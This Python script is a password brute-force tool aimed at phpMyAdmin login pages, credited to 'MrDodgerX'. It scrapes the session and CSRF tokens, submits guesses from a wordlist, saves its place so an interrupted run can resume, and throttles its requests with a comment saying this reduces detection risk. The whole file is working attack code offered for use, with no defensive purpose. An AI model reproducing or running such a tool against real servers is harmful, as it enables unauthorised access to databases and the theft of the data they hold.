import requests
import html
import re
import argparse
import os
import time
import sys
from threading import Semaphore

# Windows color support
try:
    from colorama import Fore, Style, init
    init(autoreset=True)  # Reset colors after each print
except ImportError:
    print("[-] Colorama not installed. Run: pip install colorama")
    sys.exit(1)

RESUME_FILE = "resume.txt"
BANNER = fr"""{Fore.CYAN}
                                                                
#####  #    # #####  #    # #   #   ##   #####  #    # # #    # 
#    # #    # #    # ##  ##  # #   #  #  #    # ##  ## # ##   # 
#    # ###### #    # # ## #   #   #    # #    # # ## # # # #  # 
#####  #    # #####  #    #   #   ###### #    # #    # # #  # # 
#      #    # #      #    #   #   #    # #    # #    # # #   ## 
#      #    # #      #    #   #   #    # #####  #    # # #    # 
                                                                
 ####  #####    ##    ####  #    # ###### #####                 
#    # #    #  #  #  #    # #   #  #      #    #                
#      #    # #    # #      ####   #####  #    #                
#      #####  ###### #      #  #   #      #####                 
#    # #   #  #    # #    # #   #  #      #   #                 
 ####  #    # #    #  ####  #    # ###### #    #                                                                                                                             
 {Style.RESET_ALL}
 {Fore.YELLOW}phpMyAdmin Brute-Force Tool | Supports Resume Feature{Style.RESET_ALL}
 {Fore.RED}Created by: MrDodgerX{Style.RESET_ALL}
"""

# Semaphore to limit concurrent requests to 10
concurrent_requests = Semaphore(10)

def extract_value(pattern, text):
    """Extracts value from HTML using regex safely."""
    match = re.search(pattern, text, re.I)
    return html.unescape(match.group(1)) if match else None

def attempt_login(session, url, username, password):
    """Attempts to log in with the given username and password."""
    try:
        # First request to get set_session and token
        res = session.get(url, timeout=10)  # Added timeout to avoid hanging
        if res.status_code != 200:
            print(f"{Fore.RED}[-] Failed to load login page. HTTP {res.status_code}{Style.RESET_ALL}")
            return False

        set_session = extract_value(r'name="set_session" value="(.+?)"', res.text)
        token = extract_value(r'name="token" value="(.+?)"', res.text)

        if not set_session or not token:
            print(f"{Fore.RED}[-] Failed to extract set_session or token.{Style.RESET_ALL}")
            return False

        data = {
            'set_session': set_session,
            'token': token,
            'pma_username': username,
            'pma_password': password,
        }

        # Second request to attempt login
        res = session.post(url, data=data, timeout=10)  # Added timeout
        time.sleep(0.5)  # Prevents rapid flooding, reducing detection risk

        # Basic check for successful login
        if "logout" in res.text.lower():
            print(f"{Fore.GREEN}[+] Login successful! Password: {password}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[-] Login failed with password: {password}{Style.RESET_ALL}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[-] Connection error: {e}{Style.RESET_ALL}")
        return False

def save_progress(index):
    """Saves current progress to resume later."""
    with open(RESUME_FILE, "w") as f:
        f.write(str(index))

def load_progress():
    """Loads last saved progress index if available."""
    if os.path.exists(RESUME_FILE):
        with open(RESUME_FILE, "r") as f:
            return int(f.read().strip())
    return 0

def brute_force(url, username, wordlist):
    """Brute force phpMyAdmin login using a password list with resume support."""
    try:
        with open(wordlist, "r", encoding="latin-1") as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(f"{Fore.RED}[-] Wordlist file '{wordlist}' not found.{Style.RESET_ALL}")
        return
    except UnicodeDecodeError as e:
        print(f"{Fore.RED}[-] Error decoding wordlist: {e}{Style.RESET_ALL}")
        return

    start_index = load_progress()
    total_passwords = len(passwords)

    print(f"{Fore.YELLOW}[+] Starting brute-force attack on {url} with username: {username}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] Resuming from index {start_index}/{total_passwords}...{Style.RESET_ALL}")

    session = requests.Session()  # Single session for all requests
    success = False

    try:
        for i in range(start_index, total_passwords):
            if success:
                break

            password = passwords[i].strip()
            if not password:  # Skip empty lines
                continue

            # Acquire semaphore to limit concurrent requests
            concurrent_requests.acquire()

            if attempt_login(session, url, username, password):
                success = True
                os.remove(RESUME_FILE)  # Remove resume file on success
                break

            save_progress(i + 1)  # Save progress after each attempt

            # Release semaphore after the request is done
            concurrent_requests.release()

            if i % 10 == 0:  # Print progress every 10 attempts
                print(f"{Fore.CYAN}[+] Progress: {i}/{total_passwords}{Style.RESET_ALL}")

    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}[!] Script interrupted by user. Saving progress...{Style.RESET_ALL}")
        save_progress(i + 1)  # Save progress before exiting
        print(f"{Fore.YELLOW}[!] Progress saved. Exiting...{Style.RESET_ALL}")
        sys.exit(0)

    if success:
        print(f"{Fore.GREEN}[+] Attack successful!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Attack completed. No valid password found.{Style.RESET_ALL}")

if __name__ == "__main__":
    print(BANNER)  # Show the banner before running

    parser = argparse.ArgumentParser(description="phpMyAdmin Brute-Force Tool with Resume Feature")
    parser.add_argument("--url", required=True, help="Target phpMyAdmin login URL")
    parser.add_argument("--username", required=True, help="Username for phpMyAdmin")
    parser.add_argument("--wordlist", required=True, help="Path to password wordlist file")

    args = parser.parse_args()

    brute_force(args.url, args.username, args.wordlist)